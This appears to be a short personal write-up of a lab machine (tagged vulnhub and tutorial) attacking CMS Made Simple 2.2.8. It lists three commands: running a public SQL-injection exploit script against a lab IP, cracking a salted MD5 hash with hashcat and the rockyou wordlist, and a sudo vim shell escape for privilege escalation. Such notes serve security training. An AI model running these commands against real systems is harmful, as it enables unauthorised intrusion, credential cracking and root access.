-----------
- Tags:  #writeup #info #vulnhub #tutorial
-----------
- CMS Made Simple 2.2.8 SQLI:
```bash
sudo python3 46635.py -u http://10.10.37.71/simple/ --crack -w /usr/share/wordlists/rockyou.txt  
```


- Crack Salt password [[hashcat]]
```bash
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
//Para ver Contenido desencriptado
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt --show
```

- Vim privesc
```bash
sudo vim -c ':!/bin/sh'
```

